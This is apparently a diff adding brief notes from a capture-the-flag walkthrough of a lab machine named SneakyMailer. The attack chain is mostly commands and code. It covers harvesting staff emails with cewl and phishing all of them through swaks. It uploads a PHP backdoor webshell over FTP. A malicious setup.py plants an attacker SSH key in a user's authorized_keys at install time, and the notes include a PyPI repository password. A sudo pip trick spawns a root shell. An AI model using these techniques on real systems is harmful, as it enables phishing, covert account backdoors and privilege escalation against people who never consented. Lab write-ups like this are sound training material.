@@ -1,0 +1,65 @@
+we found the main website ahd some emails
+
+we used `cewl -e --email_file emails.txt http://sneakycorp.htb/team.php`  to extact all emails
+
+then we used ==swaks== on to mail then payload and they click and get a rev shell
+
+```
+swaks --to $(cat emails.txt | tr '\n' ',') --from raj@sneakymailer.htb --header "Subject: HackingArticles" --body "Visit HackingArticles http://10.10.14.10/" --server 10.10.10.197
+
+nc -lvnp 80 #on our box
+```
+
+get creds and used it to login port 143
+
+or can use ==evolution== to automate
+
+we got creds ftp  and we can upload any file on ftp so
+
+we tried nrml php file but not worked so we used ==/usr/share/webshells/php/php-backdoor.php== nad got a shell
+
+then we used ==pypi payloaded== shell to get out ssh-key in low and got user.txt
+
+```
+#setup.py
+import setuptools
+try:
+   with open("/home/low/.ssh/authorized_keys", "a") as f:
+        f.write("\nssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCiiw9XjvZTq+Y4BdH02sqzJNmpD8PoxC19Pz9LR+810e7HxQ+FKCciEYesbrV7J2bQ+a91i5n5kl9qXWNxqnldKuIOHsY8QzhXBfZgsWOPX7h3lTb+z+kES2lHXWpRi6hheZ+K1e7iRPCC/d7j3eFiKA/tXp0w2kgwnpjDk+yg+wLSoRp4Ni+Grll9QirDRlm/xKzROiGSgyrxLVRRQXB8wxy4MOU7VIgpJKpFmojgC0W0aeJ6LJRwKDJt2hhP0UcUP74wx59rHgRAN8nR38U2mpdVzlmNphmo+AVPqEVHAdC4++E1TN5Diri9JqMNYJuI+Z9lm9ExlgDxYC7VVL5XyjlWVi0V1xQOC5yCmZuuQD6K5n67pTQIGe7EmtZhKlbqkHAAez0yTV1PMXYngpZ9xNb7ZHeQA030jgt+kVc03GrWMP0dq9w5x7JlbtxPhfAY+cZVvRc0qBl7k3gS/UV90EezwDvG/MIwUDejI6jLzNFTfaYiW7K8K+IVORpRqws= StvRat@ScaryPrt")
+        f.close()
+except Exception as e:
+   pass
+setuptools.setup(
+name="example-pkg3", # Replace with your own username
+version="0.0.1",
+author="Example Author",
+author_email="author@example.com",
+description="A small example package",
+long_description="",
+long_description_content_type="text/markdown",
+url="https://github.com/pypa/sampleproject",
+packages=setuptools.find_packages(),
+classifiers=[
+"Programming Language :: Python :: 3",
+"License :: OSI Approved :: MIT License",
+"Operating System :: OS Independent",
+],
+)
+
+#.pypirc
+
+[distutils]
+index-servers = local
+[local]
+repository: http://pypi.sneakycorp.htb:8080
+username: pypi
+password: soufianeelhaoui
+```
+
+the for root ==pip3== exploit by gtfobins
+
+```
+TF=$(mktemp -d)
+echo "import os; os.execl('/bin/sh', 'sh', '-c', 'sh <$(tty) >$(tty) 2>$(tty)')" > $TF/setup.py
+sudo pip install $TF
+```
